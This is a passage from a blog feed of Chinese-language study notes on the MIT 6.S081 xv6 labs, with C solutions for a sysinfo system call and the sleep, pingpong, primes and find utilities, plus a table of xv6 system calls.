class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span></span><br><span class="line"><span class="title function_">n_proc_num</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">proc</span> *<span class="title">p</span>;</span></span><br><span class="line">  <span class="type">int</span> n = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span>(p = proc; p &lt; &amp;proc[NPROC]; p++) &#123;</span><br><span class="line">    acquire(&amp;p-&gt;lock);</span><br><span class="line">    <span class="keyword">if</span>(p-&gt;state != UNUSED) </span><br><span class="line">        n++;</span><br><span class="line">      release(&amp;p-&gt;lock);</span><br><span class="line"> </span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> n;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在kalloc.c获取空闲内存大小，由于空闲列表是通过链表实现的且每次分配内存都为<code>PGSIZE</code>，我们可以计算<code>空闲块数*PGSIZE</code>得到。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span></span><br><span class="line"><span class="title function_">free_mem</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">  uint64 n=<span class="number">0</span>;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">run</span> *<span class="title">r</span>;</span></span><br><span class="line">  </span><br><span class="line">  acquire(&amp;kmem.lock);</span><br><span class="line">  r = kmem.freelist;</span><br><span class="line">  <span class="keyword">while</span> (r) &#123;</span><br><span class="line">    n += PGSIZE;</span><br><span class="line">    r = r-&gt;next;</span><br><span class="line">  &#125;</span><br><span class="line">  release(&amp;kmem.lock);</span><br><span class="line">  <span class="keyword">return</span> n;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在defs.h添加上述函数,方便其他系统模块调用。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// kalloc.c</span></span><br><span class="line"><span class="type">int</span>             <span class="title function_">free_mem</span><span class="params">(<span class="type">void</span>)</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// proc.c</span></span><br><span class="line"><span class="type">int</span>             <span class="title function_">n_proc_num</span><span class="params">(<span class="type">void</span>)</span>;</span><br></pre></td></tr></table></figure><p>在sysproc.c添加<code>sys_sysinfo</code>系统调用</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;sysinfo.h&quot;</span></span></span><br><span class="line"></span><br><span class="line">...</span><br><span class="line">    </span><br><span class="line">uint64</span><br><span class="line"><span class="title function_">sys_sysinfo</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">proc</span> *<span class="title">p</span> =</span> myproc();    <span class="comment">//获取进程信息</span></span><br><span class="line">  uint64 info;</span><br><span class="line">  argaddr(<span class="number">0</span>, &amp;info);   <span class="comment">//获取参数</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">sysinfo</span> <span class="title">sys_info</span>;</span></span><br><span class="line">  sys_info.freemem = free_mem();</span><br><span class="line">  sys_info.nproc = n_proc_num();</span><br><span class="line">  <span class="keyword">if</span>(copyout(p-&gt;pagetable, info, (<span class="type">char</span> *)&amp;sys_info, <span class="keyword">sizeof</span>(sys_info)) &lt; <span class="number">0</span>) <span class="comment">//将参数传递给调用者</span></span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>别忘了在makefile添加测试文件</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$U/_sysinfotest\</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> OS </category>
          
          <category> xv6 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> OS </tag>
            
            <tag> xv6 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XV6 0x1</title>
      <link href="/2024/06/28/OS/xv6_0x1/"/>
      <url>/2024/06/28/OS/xv6_0x1/</url>
      
        <content type="html"><![CDATA[<h1 id="lab1"><a href="#lab1" class="headerlink" title="lab1"></a>lab1</h1><p>xv6地址：<a href="https://pdos.csail.mit.edu/6.828/2020/schedule.html">6.S081 / Fall 2020 (mit.edu)</a></p><p>环境配置：<a href="https://blog.csdn.net/John_Snowww/article/details/129972288?spm=1001.2014.3001.5501">Mit6.s081环境配置踩坑之旅WSL2+VScode_mit6s081-CSDN博客</a></p><p>视频链接：<a href="https://www.bilibili.com/video/BV19k4y1C7kA/?spm_id_from=333.999.0.0&amp;vd_source=f59fd02e7da0d60ea4cdebb5e1c5f0d7">MIT 6.S081 2020 操作系统 [中英文字幕]_哔哩哔哩_bilibili</a></p><p>译文：<a href="https://mit-public-courses-cn-translatio.gitbook.io/mit6-s081">mit-public-courses-cn-translatio.gitbook.io</a></p><p>参考：<a href="https://xv6.dgs.zone/">课程介绍 · 6.S081 All-In-One (dgs.zone)</a></p><p>xv6做的比较快，主要是较难lab参考了dalao得。（PS：主要是自己能力就这，能完成中低难度的lab已经是万幸了）</p><blockquote><p> Design is sort of high level structure, and implementation is really about what the code looks like. </p><p>设计是一种高层次的结构，而实现则是关于代码真正的样子</p></blockquote><p>OS Purpose：</p><ul><li>ABSTRACT</li><li>MULTIPLEX</li><li>ISOLATION</li><li>SHARING</li><li>SECURITY</li><li>PERFORMANCE</li><li>RANGE OF OSES</li></ul><p>WHY HARD/INTERESTING？</p><ul><li>TENSIONS<ul><li>EFFICIENT —— ABSTRACE</li><li>POWERFUL —— SIMPLE</li><li>FLEXIBLE —— SECURE</li></ul></li></ul><p>一个xv6<code>进程</code>由<code>用户空间内存</code>和<code>内核私有的进程状态</code>组成。</p><p><code>&quot;user/user.h&quot;</code>列出了可以使用的系统调用，与普通函数不同，系统调用最终会跳转到内核中。</p><div class="table-container"><table><thead><tr><th>系统调用</th><th>描述</th></tr></thead><tbody><tr><td><code>int fork()</code></td><td>创建一个进程，返回子进程的PID。</td></tr><tr><td><code>int exit(int status)</code></td><td>终止当前进程；状态通过<code>wait()</code>报告。不返回。</td></tr><tr><td><code>int wait(int *status)</code></td><td>等待子进程退出；退出状态存储在<code>*status</code>中；返回子进程PID。</td></tr><tr><td><code>int kill(int pid)</code></td><td>终止进程PID。返回0，错误时返回-1。</td></tr><tr><td><code>int getpid()</code></td><td>返回当前进程的PID。</td></tr><tr><td><code>int sleep(int n)</code></td><td>暂停<code>n</code>个时钟滴答。</td></tr><tr><td><code>int exec(char *file, char *argv[])</code></td><td>加载一个文件并执行它，带参数；只有在出错时返回。</td></tr><tr><td><code>char *sbrk(int n)</code></td><td>将进程的内存增加<code>n</code>字节。返回新内存的起始位置。</td></tr><tr><td><code>int open(char *file, int flags)</code></td><td>打开一个文件；标志指示读/写；返回一个文件描述符(fd)。</td></tr><tr><td><code>int write(int fd, char *buf, int n)</code></td><td>从<code>buf</code>中写<code>n</code>字节到文件描述符<code>fd</code>；返回<code>n</code>。</td></tr><tr><td><code>int read(int fd, char *buf, int n)</code></td><td>读<code>n</code>字节到<code>buf</code>；返回读取的字节数；文件结尾时返回0。</td></tr><tr><td><code>int close(int fd)</code></td><td>释放打开的文件描述符<code>fd</code>。</td></tr><tr><td><code>int dup(int fd)</code></td><td>返回一个新的文件描述符，引用与<code>fd</code>相同的文件。</td></tr><tr><td><code>int pipe(int p[])</code></td><td>创建一个管道，将读/写文件描述符放入<code>p[0]</code>和<code>p[1]</code>中。</td></tr><tr><td><code>int chdir(char *dir)</code></td><td>更改当前目录。</td></tr><tr><td><code>int mkdir(char *dir)</code></td><td>创建一个新目录。</td></tr><tr><td><code>int mknod(char *file, int, int)</code></td><td>创建一个设备文件。</td></tr><tr><td><code>int fstat(int fd, struct stat *st)</code></td><td>将打开文件的信息放入<code>*st</code>中。</td></tr><tr><td><code>int stat(char *file, struct stat *st)</code></td><td>将命名文件的信息放入<code>*st</code>中。</td></tr><tr><td><code>int link(char *file1, char *file2)</code></td><td>为文件<code>file1</code>创建另一个名字(<code>file2</code>)。</td></tr><tr><td><code>int unlink(char *file)</code></td><td>删除一个文件。</td></tr></tbody></table></div><h3 id="utilities"><a href="#utilities" class="headerlink" title="utilities"></a>utilities</h3><h4 id="sleep"><a href="#sleep" class="headerlink" title="sleep"></a>sleep</h4><p>直接调用sleep系统调用即可</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;kernel/types.h&quot;</span>   <span class="comment">//数据类型头文件</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;user/user.h&quot;</span>      <span class="comment">//系统调用</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> </span><br><span class="line"><span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>* argv[])</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span>(argc != <span class="number">2</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">char</span> str[<span class="number">15</span>] = <span class="string">&quot;Args must be 2!&quot;</span>;</span><br><span class="line">        write(<span class="number">2</span>, str, <span class="built_in">strlen</span>(str)); </span><br><span class="line">        <span class="comment">//0标准输入，1标准输出，2标准错误</span></span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    sleep(atoi(argv[<span class="number">1</span>]));<span class="comment">//转化为整型</span></span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="pingpong"><a href="#pingpong" class="headerlink" title="pingpong"></a>pingpong</h4><p>这里为什么要用两个pipe呢，这是为了防止自己在输入数据后数据又被自己读到。类似于<code>全双工通信</code>吧</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;kernel/types.h&quot;</span>   </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;user/user.h&quot;</span>      </span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> </span><br><span class="line"><span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>* argv[])</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> p1[<span class="number">2</span>], p2[<span class="number">2</span>];</span><br><span class="line">    <span class="type">int</span> pid;</span><br><span class="line">    pipe(p1);</span><br><span class="line">    pipe(p2);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(argc != <span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">char</span> str[<span class="number">15</span>] = <span class="string">&quot;Args must be 1!&quot;</span>;</span><br><span class="line">        write(<span class="number">2</span>, str, <span class="built_in">strlen</span>(str)); </span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>((pid = fork()) == <span class="number">0</span>) <span class="comment">//子进程</span></span><br><span class="line">    &#123;</span><br><span class="line">        close(p1[<span class="number">1</span>]);   <span class="comment">//关闭不使用的文件描述符</span></span><br><span class="line">        close(p2[<span class="number">0</span>]);</span><br><span class="line">        <span class="type">char</span> arr2[<span class="number">10</span>] = <span class="string">&quot;pong&quot;</span>;</span><br><span class="line">        <span class="type">char</span> buf[<span class="number">10</span>];</span><br><span class="line">        <span class="type">int</span> n;</span><br><span class="line">        n = read(p1[<span class="number">0</span>], buf, <span class="number">4</span>);</span><br><span class="line">        buf[n] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d: received %s\n&quot;</span>, getpid(), buf);</span><br><span class="line">        write(p2[<span class="number">1</span>], arr2, <span class="built_in">strlen</span>(arr2));</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;                          <span class="comment">//父进程</span></span><br><span class="line">        close(p1[<span class="number">0</span>]);   <span class="comment">//关闭不使用的文件描述符</span></span><br><span class="line">        close(p2[<span class="number">1</span>]);   </span><br><span class="line">        <span class="type">char</span> arr1[<span class="number">10</span>] = <span class="string">&quot;ping&quot;</span>;</span><br><span class="line">        <span class="type">char</span> buf[<span class="number">10</span>];</span><br><span class="line">        <span class="type">int</span> n;</span><br><span class="line">        write(p1[<span class="number">1</span>], arr1, <span class="built_in">strlen</span>(arr1));</span><br><span class="line">        n = read(p2[<span class="number">0</span>], buf, <span class="number">4</span>);</span><br><span class="line">        buf[n] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d: received %s\n&quot;</span>, getpid(), buf);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="prime"><a href="#prime" class="headerlink" title="prime"></a>prime</h4><p>主进程将2~35的数据以整型的方式写入到管道中，然后逐个int读取管道内容</p><ul><li>若该数为质数，则fork进程，将未读的数据通过管道传给子进程，然后递归调用func判断质数（注意父进程要<code>wait(0)</code>回收<code>僵尸进程</code>）</li><li>若该数不为质数，则递归调用func判断下一数字</li><li>关闭不必要的管道以减少需要的文件描述符数量</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;kernel/types.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;user/user.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">isPrime</span><span class="params">(<span class="type">int</span> n)</span> &#123;</span><br><span class="line">    <span class="type">int</span> i;</span><br><span class="line">    <span class="keyword">if</span> (n &lt; <span class="number">2</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">2</span>; i &lt;= n / <span class="number">2</span>; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (n % i == <span class="number">0</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">func</span><span class="params">(<span class="type">int</span> pipe_out)</span> &#123;</span><br><span class="line">    <span class="type">int</span> x;</span><br><span class="line">    <span class="keyword">if</span> (read(pipe_out, &amp;x, <span class="keyword">sizeof</span>(<span class="type">int</span>)) == <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span>; <span class="comment">// 如果读不到数据，直接返回</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (isPrime(x)) &#123;</span><br><span class="line">        <span class="type">int</span> p[<span class="number">2</span>];</span><br><span class="line">        pipe(p);</span><br><span class="line">        <span class="keyword">if</span> (fork() == <span class="number">0</span>) &#123; <span class="comment">// 子进程</span></span><br><span class="line">            close(pipe_out);</span><br><span class="line">            close(p[<span class="number">1</span>]);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;prime %d\n&quot;</span>, x);</span><br><span class="line">            func(p[<span class="number">0</span>]);</span><br><span class="line">            close(p[<span class="number">0</span>]);</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123; <span class="comment">// 父进程</span></span><br><span class="line">            close(p[<span class="number">0</span>]);</span><br><span class="line">            <span class="type">int</span> xx;</span><br><span class="line">            <span class="keyword">while</span> (read(pipe_out, &amp;xx, <span class="keyword">sizeof</span>(<span class="type">int</span>)) &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                write(p[<span class="number">1</span>], &amp;xx, <span class="keyword">sizeof</span>(<span class="type">int</span>));</span><br><span class="line">            &#125;</span><br><span class="line">            close(pipe_out);</span><br><span class="line">            close(p[<span class="number">1</span>]);</span><br><span class="line">            wait(<span class="number">0</span>); <span class="comment">// 等待子进程结束,防止子进程成为僵尸进程</span></span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        func(pipe_out);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> *argv[])</span> &#123;</span><br><span class="line">    <span class="type">int</span> p[<span class="number">2</span>];</span><br><span class="line">    pipe(p);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (argc != <span class="number">1</span>) &#123;</span><br><span class="line">        <span class="type">char</span> str[] = <span class="string">&quot;Args must be 1!&quot;</span>;</span><br><span class="line">        write(<span class="number">2</span>, str, <span class="built_in">strlen</span>(str));</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">2</span>; i &lt;= <span class="number">35</span>; i++) &#123;</span><br><span class="line">        write(p[<span class="number">1</span>], &amp;i, <span class="keyword">sizeof</span>(<span class="type">int</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    close(p[<span class="number">1</span>]);</span><br><span class="line">    func(p[<span class="number">0</span>]);</span><br><span class="line">    close(p[<span class="number">0</span>]);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="find"><a href="#find" class="headerlink" title="find"></a>find</h4><p>跟着<code>ls.c</code>照葫芦画瓢即可</p><p>注意<code>ls.c</code>文件<code>memset(buf+strlen(p), &#39; &#39;, DIRSIZ-strlen(p));</code>的设置是为了使输出对齐。我们不能直接<code>ctrl+c</code>，因为我们要匹配字符串，而字符串以<code>\0</code>结尾，可以使用<code>buf[strlen(p)] = 0;</code>替代</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;kernel/fs.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;kernel/stat.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;kernel/types.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;user/user.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">char</span> *<span class="title function_">fmtname</span><span class="params">(<span class="type">char</span> *path)</span> &#123;</span><br><span class="line">  <span class="type">static</span> <span class="type">char</span> buf[DIRSIZ + <span class="number">1</span>]; <span class="comment">// static防止返回时被清理</span></span><br><span class="line">  <span class="type">char</span> *p;</span><br><span class="line">  <span class="keyword">for</span> (p = path + <span class="built_in">strlen</span>(path); p &gt;= path &amp;&amp; *p != <span class="string">&#x27;/&#x27;</span>; p--)</span><br><span class="line">    ;</span><br><span class="line">  p++;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">strlen</span>(p) &gt;= DIRSIZ)</span><br><span class="line">    <span class="keyword">return</span> p;</span><br><span class="line">  memmove(buf, p, <span class="built_in">strlen</span>(p)); <span class="comment">//memmove防止字符串被覆盖</span></span><br><span class="line">  buf[<span class="built_in">strlen</span>(p)] = <span class="number">0</span>;         <span class="comment">// 确保以零结尾</span></span><br><span class="line">  <span class="keyword">return</span> buf;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">match</span><span class="params">(<span class="type">char</span> *str1, <span class="type">char</span> *str2)</span> &#123; <span class="keyword">return</span> <span class="built_in">strcmp</span>(str1, str2) == <span class="number">0</span>; &#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">find</span><span class="params">(<span class="type">char</span> *path, <span class="type">char</span> *str)</span> &#123;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">512</span>], *p;</span><br><span class="line">  <span class="type">int</span> fd;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">dirent</span> <span class="title">de</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">stat</span> <span class="title">st</span>;</span></span><br><span class="line">  <span class="keyword">if</span> ((fd = open(path, <span class="number">0</span>)) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="number">2</span>, <span class="string">&quot;find: cannot open %s\n&quot;</span>, path);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (fstat(fd, &amp;st) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="number">2</span>, <span class="string">&quot;find: cannot stat %s\n&quot;</span>, path);</span><br><span class="line">    close(fd);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">switch</span> (st.type) &#123;</span><br><span class="line">  <span class="keyword">case</span> T_FILE:</span><br><span class="line">    <span class="keyword">if</span> (match(fmtname(path), str))</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>, path);</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">  <span class="keyword">case</span> T_DIR:</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">strlen</span>(path) + <span class="number">1</span> + DIRSIZ + <span class="number">1</span> &gt; <span class="keyword">sizeof</span>(buf)) &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;find: path too long\n&quot;</span>);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">strcpy</span>(buf, path);</span><br><span class="line">    p = buf + <span class="built_in">strlen</span>(buf);</span><br><span class="line">    *p++ = <span class="string">&#x27;/&#x27;</span>;</span><br><span class="line">    <span class="keyword">while</span> (read(fd, &amp;de, <span class="keyword">sizeof</span>(de)) == <span class="keyword">sizeof</span>(de)) &#123;</span><br><span class="line">      <span class="keyword">if</span> (de.inum == <span class="number">0</span> || de.inum == <span class="number">1</span> || match(de.name, <span class="string">&quot;.&quot;</span>) ||</span><br><span class="line">          match(de.name, <span class="string">&quot;..&quot;</span>))</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">      memmove(p, de.name, <span class="built_in">strlen</span>(de.name));</span><br><span class="line">      p[<span class="built_in">strlen</span>(de.name)] = <span class="number">0</span>;</span><br><span class="line">      find(buf, str);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  close(fd);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> *argv[])</span> &#123;</span><br><span class="line">  <span class="keyword">if</span> (argc != <span class="number">3</span>) &#123;</span><br><span class="line">    <span class="type">char</span> str[<span class="number">15</span>] = <span class="string">&quot;Args must be 3!&quot;</span>;</span><br><span class="line">    write(<span class="number">2</span>, str, <span class="built_in">strlen</span>(str));</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  find(argv[<span class="number">1</span>], argv[<span class="number">2</span>]);</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="xargs"><a href="#xargs" class="headerlink" 